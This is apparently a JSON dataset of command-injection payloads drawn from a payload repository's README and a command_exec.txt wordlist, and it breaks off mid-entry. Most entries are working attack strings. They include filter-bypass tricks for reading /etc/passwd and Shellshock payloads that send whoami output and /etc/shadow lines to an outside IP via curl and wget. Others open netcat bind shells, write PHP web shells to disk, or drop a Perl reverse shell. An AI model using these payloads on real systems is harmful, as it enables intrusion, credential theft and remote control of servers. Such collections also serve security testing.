[
  {
    "payload": "    $ip = $_GET['ip'];\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "    system(\"ping -c 4 \" . $ip);\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1; command2   # Execute command1 and then command2\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1 && command2 # Execute command2 only if command1 succeeds\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1 || command2 # Execute command2 only if command1 fails\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1 | command2  # Pipe the output of command1 into command2\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "    chrome '--gpu-launcher=\"id>/tmp/foo\"'\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "    ssh '-oProxyCommand=\"touch /tmp/foo\"' foo@foo\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "    psql -o'|id>/tmp/foo'\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "$url = \"https://example.tld/\" . $_GET['path'] . \".txt\";\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "system(\"wget.exe -q \" . escapeshellarg($url));\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "    # -o, --output <file>        Write to file instead of stdout\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  original_cmd_by_server $(cat /etc/passwd)\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  cat${IFS}/etc/passwd\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  ls${IFS}-la\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  cat</etc/passwd\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  sh</dev/tcp/127.0.0.1/4242\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  X=$'uname\\x20-a'&&$X\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  ;ls%09-al%09/home\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "{,$\"whoami\",}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ echo ${HOME:0:1}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ echo . | tr '!-0' '\"-1'\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ tr '!-0' '\"-1' <<< .\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"`\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "w'h'o'am'i\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "wh''oami\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "'w'hoami\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "w\"h\"o\"am\"i\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "wh\"\"oami\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "\"wh\"oami\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo whoami|$0\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "who$()ami\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "who$(echo am)i\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "cat ${test//hhh\\/hm/}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "cat ${test//hh??hm/}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  for i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  echo \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  echo \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\"\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "nohup sleep 120 > /dev/null &\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "g=\"/e\"\\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@<${g//hh??hm/}\n",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* [Bypass With $()](#bypass-with--1)",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "$ip = $_GET['ip'];",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "system(\"ping -c 4 \" . $ip);",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* `;` (Semicolon): Allows you to execute multiple commands sequentially.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1; command2   # Execute command1 and then command2",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1 && command2 # Execute command2 only if command1 succeeds",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1 || command2 # Execute command2 only if command1 fails",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "command1 | command2  # Pipe the output of command1 into command2",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "chrome '--gpu-launcher=\"id>/tmp/foo\"'",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "ssh '-oProxyCommand=\"touch /tmp/foo\"' foo@foo",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "psql -o'|id>/tmp/foo'",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "$url = \"https://example.tld/\" . $_GET['path'] . \".txt\";",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "system(\"wget.exe -q \" . escapeshellarg($url));",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "# -o, --output <file>        Write to file instead of stdout",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "original_cmd_by_server $(cat /etc/passwd)",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "cat${IFS}/etc/passwd",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "ls${IFS}-la",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* Input redirection. The < character tells the shell to read the contents of the file specified.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "cat</etc/passwd",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "sh</dev/tcp/127.0.0.1/4242",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "X=$'uname\\x20-a'&&$X",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": ";ls%09-al%09/home",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "{,$\"whoami\",}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ echo ${HOME:0:1}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ echo . | tr '!-0' '\"-1'",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ tr '!-0' '\"-1' <<< .",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "w'h'o'am'i",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "wh''oami",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "'w'hoami",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "w\"h\"o\"am\"i",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "wh\"\"oami",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "\"wh\"oami",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo whoami|$0",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "### Bypass With $()",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "who$()ami",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "who$(echo am)i",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "cat ${test//hhh\\/hm/}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "cat ${test//hh??hm/}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "2. Execute a simple 'ls'",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "for i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about \"polyglot command injection,\" we're referring to an injection payload that can be executed in multiple contexts or environments.",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\"",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "nohup sleep 120 > /dev/null &",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "g=\"/e\"\\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@<${g//hh??hm/}",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "* [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - kacperszurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)",
    "category": "command injection",
    "source_file": "README.md"
  },
  {
    "payload": "%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "%20{${phpinfo()}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "%20{${sleep(20)}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "%20{${sleep(3)}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "a|id|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "a;id|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "a;id;",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "a;id\\n",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\\`whoami\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\\`pwd\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\\`grep root /etc/shadow\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname -a\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\`nc -lvvp 1234 -e /bin/bash\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\`nc -lvvp 1236 -e /bin/bash &\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"sleep 1 && echo vulnerable 1\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"sleep 3 && echo vulnerable 3\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"sleep 6 && echo vulnerable 6\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\\`whoami\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\\`pwd\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\`grep root /etc/shadow\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\\`uname -a\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\\`nc -lvvp 1235 -e /bin/bash\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\\`nc -lvvp 1237 -e /bin/bash &\\`\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\"",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`cat /etc/passwd`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| curl http://crowdshield.com/.testing/rce.txt",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; curl https://crowdshield.com/.testing/rce_vuln.txt",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& curl https://crowdshield.com/.testing/rce_vuln.txt",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\\\" |curl https://crowdshield.com/.testing/rce_vuln.txt",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| dir",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; dir",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`dir`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&&dir",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& dir",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| dir C:\\",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; dir C:\\",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& dir C:\\",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| dir C:\\Documents and Settings\\*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; dir C:\\Documents and Settings\\*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& dir C:\\Documents and Settings\\*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| dir C:\\Users",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; dir C:\\Users",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& dir C:\\Users",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";echo%20'<script>alert(1)</script>'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| echo \"<?php include($_GET['page'])| ?>\" > rfi.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; echo \"<?php include($_GET['page']); ?>\" > rfi.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& echo \"<?php include($_GET['page']); ?>\" > rfi.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& echo \"<?php include($_GET['page']); ?>\" > rfi.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "echo \"<?php include($_GET['page']); ?>\" > rfi.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| echo \"<?php system('dir $_GET['dir']')| ?>\" > dir.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| echo \"<?php system($_GET['cmd'])| ?>\" > cmd.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "echo \"<?php system($_GET['cmd']); ?>\" > cmd.php",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";echo '<script>alert(1)</script>'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "echo '<script>alert(1)</script>'// XXXXXXXXXXX",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
